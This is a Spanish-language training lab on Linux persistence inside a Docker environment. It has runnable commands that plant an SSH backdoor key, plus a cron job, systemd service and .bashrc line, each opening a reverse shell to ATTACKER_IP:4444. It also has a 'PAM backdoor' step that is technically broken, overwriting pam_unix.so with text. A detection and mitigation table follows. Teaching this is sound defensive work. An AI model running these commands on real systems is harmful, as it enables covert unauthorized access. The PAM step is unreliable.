# 🔄 Lab 03: Persistencia Linux

## Objetivo

Practicar técnicas de persistencia en Linux manteniendo acceso tras reinicios o cierre de sesiones.

## Escenario

Eres un atacante con acceso root comprometido. Tu objetivo es establecer persistencia que sobreviva a reinicios.

## Entorno

- **Sistema:** Ubuntu 22.04 LTS
- **Acceso inicial:** Root (vía shell)
- **Target:** Mantener acceso persistente

## Técnicas Implementadas

| # | Técnica | Categoría | Supervivencia |
|---|---------|-----------|---------------|
| 1 | SSH Keys | Autenticación | ✅ Persistente |
| 2 | Cron Job | Programación | ✅ Persistente |
| 3 | Systemd Service | Servicios | ✅ Persistente |
| 4 | .bashrc Injection | Shell | ⚠️ Solo sesión |
| 5 | PAM Backdoor | Autenticación | ✅ Persistente |

## Inicio Rápido

```bash
# Levantar el entorno
docker compose up -d

# Obtener shell root
docker compose exec persistence-lab bash
```

## Instrucciones

### Paso 1: Establecer Persistencia con SSH Keys

```bash
# Crear par de claves
ssh-keygen -t rsa -b 4096 -f /root/.ssh/backdoor -N ""

# Agregar clave pública al usuario target
cat /root/.ssh/backdoor.pub >> /home/lowuser/.ssh/authorized_keys
chmod 600 /home/lowuser/.ssh/authorized_keys

# Probar conexión
ssh -i /root/.ssh/backdoor lowuser@localhost
```

### Paso 2: Crear Cron Job Persistente

```bash
# Crear script de reconexión
cat > /usr/local/bin/persistence.sh << 'EOF'
#!/bin/bash
# Script de persistencia
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /usr/local/bin/persistence.sh

# Agregar cron job (se ejecuta cada minuto)
echo "* * * * * root /usr/local/bin/persistence.sh" >> /etc/crontab
```

### Paso 3: Crear Systemd Service

```bash
# Crear servicio systemd
cat > /etc/systemd/system/persistence.service << 'EOF'
[Unit]
Description=Persistent Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/persistence.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Habilitar e iniciar servicio
systemctl daemon-reload
systemctl enable persistence.service
systemctl start persistence.service
```

### Paso 4: Inyectar en .bashrc

```bash
# Agregar comando malicioso al .bashrc
echo 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &' >> /home/lowuser/.bashrc
```

### Paso 5: Crear PAM Backdoor

```bash
# Compilar módulo PAM malicioso (ejemplo simplificado)
cat > /lib/security/pam_unix.so << 'EOF'
# Backdoor PAM module
auth optional pam_unix.so
EOF
```

## Verificación de Persistencia

```bash
# Verificar cron jobs
crontab -l
cat /etc/crontab

# Verificar servicios
systemctl list-unit-files | grep persistence

# Verificar SSH keys
ls -la /root/.ssh/
cat /home/lowuser/.ssh/authorized_keys

# Verificar .bashrc
cat /home/lowuser/.bashrc | tail -5
```

## Criterios de Éxito

- [ ] Establecer al menos 3 técnicas de persistencia
- [ ] Verificar que persisten tras reinicio
- [ ] Documentar cada técnica implementada
- [ ] Identificar técnicas de detección

## Detección y Mitigación

| Técnica | Detección | Mitigación |
|---------|-----------|------------|
| SSH Keys | Auditoría de authorized_keys | Usar certificados SSH con expiración |
| Cron Jobs | Monitoreo de /etc/crontab | Auditar cron jobs regularmente |
| Systemd | Monitoreo de servicios | Revisar servicios desconocidos |
| .bashrc | Auditoría de archivos | Usar filesystem inmutable |
| PAM | Auditoría de módulos | Verificar integridad de PAM |

## Limpieza

```bash
# Detener y eliminar el entorno
docker compose down -v --rmi all
```

---

*Lab creado para fines educativos — CyberDefense-Pro-Network*
